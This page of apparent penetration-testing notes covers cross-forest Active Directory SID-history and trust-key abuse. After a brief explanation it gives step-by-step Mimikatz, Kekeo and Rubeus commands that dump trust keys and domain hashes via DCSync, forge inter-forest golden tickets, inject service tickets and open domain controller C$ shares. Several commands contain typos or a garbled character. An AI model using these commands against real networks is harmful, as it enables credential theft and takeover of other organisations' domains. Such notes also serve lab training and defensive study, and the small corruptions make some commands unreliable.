# 🟢 SID Abuse

Cross-domain attacks involving forest root and SID (Security Identifier) abuse exploit vulnerabilities in trust relationships between different Active Directory forest domains.&#x20;

These attacks manipulate the trust keys and SIDs to forge authentication tokens, allowing unauthorized access to resources across domains.&#x20;

By abusing SID and trust relationships, attackers can potentially gain access to sensitive information, escalate privileges, and compromise the security of interconnected systems.&#x20;

This technique underscores the importance of robust security measures and vigilant monitoring of inter-forest trust relationships to protect against such sophisticated threats.

### Cross-Domain Attacks: Forest Root and SID Abuse

Cross-domain attacks targeting the forest root and SID (Security Identifier) exploit vulnerabilities present in the trust relationships between different Active Directory forest domains. These vulnerabilities are manipulated by attackers to forge authentication tokens, granting unauthorized access across domains.

#### **Key Steps in the Attack**

1. **Dump Trust Keys:** Extract the trust keys of inter-forest trusts to identify the SID of the current domain, SID of the target domain, and the `rc4_hmac_nt` (Trust Key) of the target domain (e.g., `ecorp$`).
2. **Forge TGT:** Utilize the extracted information to forge an inter-forest Ticket Granting Ticket (TGT) with the correct target and RC4 parameters.
3. **Request TGS:** With the forged TGT, request a Ticket Granting Service (TGS) ticket using `asktgs.exe`.
4. **Inject TGS into Memory:** Inject the obtained TGS into memory to bypass authentication mechanisms.
5. **Access Resources:** Gain access to all shared files and admin domain controllers (DCs) within the target domain.

#### **Risks and Implications**

* Access to sensitive information
* Privilege escalation
* Compromised security of interconnected systems

#### **Mitigation Strategies**

* Implement robust security measures
* Monitor inter-forest trust relationships vigilantly
* Regularly review and update trust keys and SIDs

Understanding and protecting against such sophisticated threats is crucial for the security of interconnected systems and to prevent unauthorized access to sensitive information.

### Practice

### Invoke-Mimikatz

#### 1. We require the trust key of inter-forest trust

```
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\techcorp$"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

#### 2. Forge the inter-forest TGT

```
Invoke-Mimikatz -Command '"kerberos::golden /domain:us.techcorp.local /sid:S-1-5-21-210670787- 2521448726-163245708 /sids:S-1-5-21-2781415573- 3701854478-2406986946-519 /rc4:b59ef5860ce0aa12429f4f61c8e51979 /user:Administrator /service:krbtgt /target:techcorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:799a0ae7e6ce96369aa7f1e9da25175a /service:krbtgt /target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-519 /ticket:C:\AD\Tools\kekeo_old\sharedwitheu.kirbi"'
```

#### 3. Request a TGS

> Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket with Kekeo

```
# keko
tgs::ask /tgt:C:\AD\Tools\trust_tkt.kirbi /service:CIFS/techcorp-dc.techcorp.local
# Or using older version of Kekeo
.\asktgs.exe C:\AD\Tools\trust_tkt.kirbi CIFS/techcorp-dc.techcorp.local
```

#### 4. Inject and use the TGS

> Use the TGS to access the targeted service (may need to use it twice)

```
misc::convert lsa TGS_Administrator@us.techcorp.local_krbtgt~TECHCORP.LOCAL@US.TECHCORP.LOCAL.kirbi 
# Or
.\kirbikator.exe lsa .\CIFS.techcorp-dc.techcorp.local.kirbi
ls \\techcorp-dc.techcorp.local\c$
```

### Rubeus

#### 1. Create ticket and add it into the memory using asktgs

```
# Rubeus
.\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:cifs/techcorp-dc.techcorp.local /dc:techcorp-dc.techcorp.local /ptt

C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\sharedwitheu.kirbi /service:CIFS/euvendor-dc.euvendor.local /dc:euvendor-dc.euvendor.local /ptt

# can access the shares now
ls \\techcorp-dc.techcorp.local\c$
ls \\euvendor-dc.euvendor.local\c$
```

### PowerShell

#### 1. Access the euvendor-net machine using PSRemoting

```
# cmdlet
Invoke-Command -ScriptBlock{whoami} -ComputerName euvendor�net.euvendor.local -Authentication NegotiateWithImplicitCredential
```

### Extras

#### To use the DCSync feature for getting krbtg hash execute the below command with DC privileges

```
Invoke-Mimikatz -Command '"lsadump::dcsyn /domain:garrison.castle.local /all /cvs"'
```

#### Get the ForeignSecurityPrincipal

```
#These SIDs can access to the target domain
Get-DomainObject -Domain targetDomain.local | ? {$_.objectclass -match "foreignSecurityPrincipal"}

#With the by default SIDs, we find S-1-5-21-493355955-4215530352-779396340-1104
#We search it in our current domain
Get-DomainObject |? {$_.objectsid -match "S-1-5-21-493355955-4215530352-779396340-1104"}
```
